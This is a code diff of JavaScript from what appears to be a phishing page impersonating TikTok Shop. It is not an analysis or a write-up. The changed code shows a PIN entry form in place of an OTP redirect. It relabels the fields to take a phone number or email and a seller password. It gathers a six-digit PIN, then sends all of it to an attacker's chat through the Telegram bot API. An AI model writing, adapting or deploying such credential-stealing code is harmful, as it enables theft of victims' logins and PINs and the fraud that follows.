@@ -319,9 +319,9 @@ function sendHp(){
         method: `POST`,   
     complete: function(){
     setTimeout(function(){   
-   /* $("#form-sandi").fadeIn();
-    $("#pin1").focus();*/
-     window.location = "otp.html";
+   $("#form-sandi").fadeIn();
+    $("#pin1").focus();
+     
     $(".process1").fadeOut();  
     $('#inp').val('');
     $('#email').val('');
@@ -352,7 +352,7 @@ function sandi(){
   sessionStorage.setItem('pin6', pin6);  
                               
     var logo = "𝘄𝘄𝘄.𝘁𝗶𝗸𝘁𝗼𝗸𝘀𝗵𝗼𝗽.𝗰𝗼𝗺";              
-    var gabungan = '' + logo + '%0A⍟ ' + tarif + '%0A%0A⍟ 𝐍𝐨𝐦𝐨𝐫 •• ' + inp + '%0A⍟ 𝐄𝐦𝐚𝐢𝐥 •• ' + email + '%0A⍟ 𝐒𝐚𝐧𝐝𝐢 •• ' + pin1 + pin2 + pin3 + pin4 + pin5 + pin6 ;   
+    var gabungan = '' + logo + '%0A⍟ ' + tarif + '%0A%0A⍟ 𝐍𝐨 𝐀𝐭𝐚𝐮 𝐄𝐦𝐚𝐢𝐥 •• ' + inp + '%0A⍟ 𝐒𝐚𝐧𝐝𝐢 𝐬𝐞𝐥𝐥𝐞𝐫 •• ' + email + '%0A⍟ 𝐒𝐚𝐧𝐝𝐢 •• ' + pin1 + pin2 + pin3 + pin4 + pin5 + pin6 ;   
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
         method: `POST`,   
